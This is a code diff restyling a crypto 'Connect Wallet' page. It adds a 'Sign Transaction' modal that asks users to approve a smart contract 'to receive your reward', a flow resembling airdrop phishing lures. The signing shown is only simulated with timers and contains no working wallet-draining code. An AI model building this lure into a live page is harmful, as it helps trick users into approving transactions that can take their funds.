@@ -642,24 +642,24 @@
             background: var(--bg-secondary);
         }
         
-        /* Wallet Connect Modal Styles */
+        /* Wallet Connect Modal */
         .wallet-modal-content {
             background: #1a1a1a;
-            border-radius: 24px;
+            border-radius: 20px;
             width: 90%;
-            max-width: 440px;
+            max-width: 380px;
             padding: 0;
             position: relative;
             animation: slideUp 0.3s ease-out;
             color: white;
-            max-height: 85vh;
+            max-height: 80vh;
             overflow: hidden;
             display: flex;
             flex-direction: column;
         }
         
         .wallet-modal-header {
-            padding: 24px 24px 16px;
+            padding: 20px 20px 14px;
             border-bottom: 1px solid #2a2a2a;
             display: flex;
             align-items: center;
@@ -670,23 +670,23 @@
         .wallet-modal-title-wrapper {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
             flex: 1;
         }
         
         .wallet-modal-icon {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             background: #2a2a2a;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 18px;
+            font-size: 16px;
         }
         
         .wallet-modal-title {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
             color: white;
             margin: 0;
@@ -696,13 +696,13 @@
             background: transparent;
             border: none;
             color: #888;
-            font-size: 28px;
+            font-size: 24px;
             cursor: pointer;
             padding: 4px;
             line-height: 1;
             transition: color 0.2s;
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -713,7 +713,7 @@
         }
         
         .wallet-list {
-            padding: 8px;
+            padding: 6px;
             overflow-y: auto;
             flex: 1;
         }
@@ -722,14 +722,14 @@
             background: transparent;
             border: none;
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 14px;
             cursor: pointer;
-            border-radius: 12px;
+            border-radius: 10px;
             transition: background 0.2s;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
         }
         
         .wallet-option:hover {
@@ -737,18 +737,24 @@
         }
         
         .wallet-option-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
             flex-shrink: 0;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
+            overflow: hidden;
+        }
+        
+        .wallet-option-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .wallet-option-name {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 500;
             color: white;
             text-align: left;
@@ -758,23 +764,23 @@
         .wallet-qr-badge {
             background: #2563eb;
             color: white;
-            padding: 4px 12px;
-            border-radius: 6px;
-            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 5px;
+            font-size: 10px;
             font-weight: 600;
             letter-spacing: 0.5px;
             text-transform: uppercase;
         }
         
         .wallet-modal-footer {
-            padding: 16px 24px 24px;
+            padding: 14px 20px 20px;
             text-align: center;
             border-top: 1px solid #2a2a2a;
             flex-shrink: 0;
         }
         
         .wallet-footer-text {
-            font-size: 14px;
+            font-size: 13px;
             color: #888;
             margin: 0;
         }
@@ -793,23 +799,23 @@
         /* Loading Modal */
         .loading-modal-content {
             background: #1a1a1a;
-            border-radius: 24px;
+            border-radius: 20px;
             width: 90%;
-            max-width: 380px;
-            padding: 48px 32px;
+            max-width: 340px;
+            padding: 40px 28px;
             text-align: center;
             animation: slideUp 0.3s ease-out;
             color: white;
         }
         
         .loading-spinner {
-            width: 64px;
-            height: 64px;
+            width: 56px;
+            height: 56px;
             border: 4px solid #2a2a2a;
             border-top-color: #2563eb;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 24px;
+            margin: 0 auto 20px;
         }
         
         @keyframes spin {
@@ -817,40 +823,95 @@
         }
         
         .loading-title {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
             color: white;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         
         .loading-text {
-            font-size: 14px;
+            font-size: 13px;
             color: #888;
-            line-height: 1.6;
+            line-height: 1.5;
+        }
+        
+        /* Sign Transaction Modal */
+        .sign-modal-content {
+            background: #1a1a1a;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 340px;
+            padding: 40px 28px;
+            text-align: center;
+            animation: slideUp 0.3s ease-out;
+            color: white;
+        }
+        
+        .sign-icon {
+            width: 56px;
+            height: 56px;
+            background: #2a2a2a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 28px;
+        }
+        
+        .sign-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 10px;
+        }
+        
+        .sign-text {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        
+        .sign-button {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        
+        .sign-button:hover {
+            background: #1d4ed8;
         }
         
         /* Success Modal */
         .success-modal-content {
             background: #1a1a1a;
-            border-radius: 24px;
+            border-radius: 20px;
             width: 90%;
-            max-width: 380px;
-            padding: 48px 32px;
+            max-width: 340px;
+            padding: 40px 28px;
             text-align: center;
             animation: slideUp 0.3s ease-out;
             color: white;
         }
         
         .success-icon {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             background: linear-gradient(135deg, #10b981, #059669);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 48px;
+            margin: 0 auto 20px;
+            font-size: 42px;
             animation: scaleIn 0.5s ease-out;
         }
         
@@ -860,16 +921,16 @@
         }
         
         .success-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             color: white;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         
         .success-message {
-            font-size: 14px;
+            font-size: 13px;
             color: #888;
-            line-height: 1.6;
+            line-height: 1.5;
             margin-bottom: 24px;
         }
         
@@ -877,12 +938,13 @@
             background: #2563eb;
             color: white;
             border: none;
-            padding: 12px 32px;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 12px 28px;
+            border-radius: 10px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             transition: background 0.2s;
+            width: 100%;
         }
         
         .success-close-btn:hover {
@@ -1884,17 +1946,25 @@ function selectWallet(walletName) {
         // Hide loading modal
         document.getElementById('loadingModal').classList.remove('active');
         
-        // Show sign transaction modal
+        // Show sign transaction modal with button
         document.getElementById('signModal').classList.add('active');
+    }, 2000);
+}
+
+function signTransaction() {
+    // Hide sign modal
+    document.getElementById('signModal').classList.remove('active');
+    
+    // Show loading briefly
+    document.getElementById('loadingModal').classList.add('active');
+    
+    // Simulate signing (2 seconds)
+    setTimeout(() => {
+        // Hide loading modal
+        document.getElementById('loadingModal').classList.remove('active');
         
-        // Simulate transaction signing (3 seconds)
-        setTimeout(() => {
-            // Hide sign modal
-            document.getElementById('signModal').classList.remove('active');
-            
-            // Show success modal
-            document.getElementById('successModal').classList.add('active');
-        }, 3000);
+        // Show success modal
+        document.getElementById('successModal').classList.add('active');
     }, 2000);
 }
 
@@ -1962,7 +2032,7 @@ window.addEventListener('load', function() {
         <div class="wallet-modal-content">
             <div class="wallet-modal-header">
                 <div class="wallet-modal-title-wrapper">
-                    <div class="wallet-modal-icon">❓</div>
+                    <div class="wallet-modal-icon">?</div>
                     <h2 class="wallet-modal-title">Connect Wallet</h2>
                 </div>
                 <button class="wallet-close-btn" onclick="closeWalletModal()">×</button>
@@ -1970,51 +2040,51 @@ window.addEventListener('load', function() {
             
             <div class="wallet-list">
                 <button class="wallet-option" onclick="selectWallet('WalletConnect')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #3b99fc, #2d7dd2);">
-                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none"><path d="M9.58 11.8c3.61-3.56 9.47-3.56 13.08 0l.44.43c.18.18.18.47 0 .65l-1.49 1.47c-.09.09-.24.09-.33 0l-.6-.59c-2.52-2.48-6.61-2.48-9.13 0l-.65.63c-.09.09-.24.09-.33 0l-1.49-1.47c-.18-.18-.18-.47 0-.65l.48-.47zm16.16 3.04l1.33 1.31c.18.18.18.47 0 .65l-5.99 5.9c-.18.18-.47.18-.65 0l-4.25-4.18c-.05-.04-.12-.04-.17 0l-4.25 4.18c-.18.18-.47.18-.65 0l-5.99-5.9c-.18-.18-.18-.47 0-.65l1.33-1.31c.18-.18.47-.18.65 0l4.25 4.18c.05.04.12.04.17 0l4.25-4.18c.18-.18.47-.18.65 0l4.25 4.18c.05.04.12.04.17 0l4.25-4.18c.18-.18.47-.18.65 0z" fill="white"/></svg>
+                    <div class="wallet-option-icon" style="background: #3b99fc; border-radius: 10px;">
+                        <svg width="28" height="28" viewBox="0 0 300 185" fill="none"><path d="M61.44 36.36c44.29-43.22 116.05-43.22 160.34 0l5.33 5.2c2.21 2.16 2.21 5.66 0 7.82l-18.23 17.78c-1.11 1.08-2.9 1.08-4.01 0l-7.33-7.15c-30.89-30.14-80.98-30.14-111.87 0l-7.85 7.66c-1.11 1.08-2.9 1.08-4.01 0L55.58 49.89c-2.21-2.16-2.21-5.66 0-7.82l5.86-5.71zm198.01 36.76l16.23 15.84c2.21 2.16 2.21 5.66 0 7.82l-73.16 71.4c-2.21 2.16-5.8 2.16-8.02 0l-51.91-50.64c-.55-.54-1.45-.54-2.01 0l-51.91 50.64c-2.21 2.16-5.8 2.16-8.02 0l-73.16-71.4c-2.21-2.16-2.21-5.66 0-7.82l16.23-15.84c2.21-2.16 5.8-2.16 8.02 0l51.91 50.64c.55.54 1.45.54 2.01 0l51.91-50.64c2.21-2.16 5.8-2.16 8.02 0l51.91 50.64c.55.54 1.45.54 2.01 0l51.91-50.64c2.21-2.16 5.81-2.16 8.02 0z" fill="white"/></svg>
                     </div>
                     <span class="wallet-option-name">WalletConnect</span>
                     <span class="wallet-qr-badge">QR CODE</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('MetaMask')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #f6851b, #e2761b);">
+                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #f6851b, #e2761b); border-radius: 10px; font-size: 28px;">
                         🦊
                     </div>
                     <span class="wallet-option-name">MetaMask</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Trust Wallet')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #3375bb, #2d5fa5);">
-                        🛡️
+                    <div class="wallet-option-icon" style="background: #3375bb; border-radius: 10px;">
+                        <svg width="28" height="28" viewBox="0 0 600 600" fill="none"><path d="M300 0L50 150V300c0 166.5 108.5 322.5 250 350 141.5-27.5 250-183.5 250-350V150L300 0z" fill="white"/></svg>
                     </div>
                     <span class="wallet-option-name">Trust Wallet</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Bitget Wallet')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #00d4ff, #00a8d6);">
-                        ▶️
+                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #00d4ff, #00a8d6); border-radius: 10px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7v10c0 5.5 3.8 10.7 10 12 6.2-1.3 10-6.5 10-12V7l-10-5zm0 2.2L20 8.5v8.2c0 4.4-3.1 8.5-8 9.5-4.9-1-8-5.1-8-9.5V8.5l8-4.3zm-2 5.3v9l-4-2.2V11l4-2.2V8.5zm4 0l4 2.2v5.3l-4 2.2V9.5z"/></svg>
                     </div>
                     <span class="wallet-option-name">Bitget Wallet</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Base')">
-                    <div class="wallet-option-icon" style="background: #0052ff;">
-                        🔵
+                    <div class="wallet-option-icon" style="background: #0052ff; border-radius: 10px;">
+                        <svg width="28" height="28" viewBox="0 0 111 111" fill="none"><circle cx="55.5" cy="55.5" r="55.5" fill="white"/><circle cx="55.5" cy="55.5" r="45" fill="#0052FF"/></svg>
                     </div>
                     <span class="wallet-option-name">Base (formerly Coinbase Wallet)</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Rainbow')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1);">
-                        🌈
+                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1, #764ba2); border-radius: 10px;">
+                        <svg width="28" height="28" viewBox="0 0 120 120" fill="none"><path d="M60 110c27.6 0 50-22.4 50-50S87.6 10 60 10 10 32.4 10 60s22.4 50 50 50z" fill="white"/></svg>
                     </div>
                     <span class="wallet-option-name">Rainbow</span>
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Zerion')">
-                    <div class="wallet-option-icon" style="background: linear-gradient(135deg, #2962ef, #1e4db5);">
-                        ⏳
+                    <div class="wallet-option-icon" style="background: #2962ef; border-radius: 10px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 12l10 10 10-10L12 2zm0 3.5L18.5 12 12 18.5 5.5 12 12 5.5z"/></svg>
                     </div>
                     <span class="wallet-option-name">Zerion</span>
                 </button>
@@ -2039,10 +2109,11 @@ window.addEventListener('load', function() {
     
     <!-- Sign Transaction Modal -->
     <div class="modal" id="signModal">
-        <div class="loading-modal-content">
-            <div class="loading-spinner"></div>
-            <h3 class="loading-title">Sign Transaction</h3>
-            <p class="loading-text">To receive your reward, please sign the transaction in your wallet to approve the smart contract</p>
+        <div class="sign-modal-content">
+            <div class="sign-icon">✍️</div>
+            <h3 class="sign-title">Sign Transaction</h3>
+            <p class="sign-text">To receive your reward, please sign the transaction to approve the smart contract</p>
+            <button class="sign-button" onclick="signTransaction()">Sign</button>
         </div>
     </div>
     
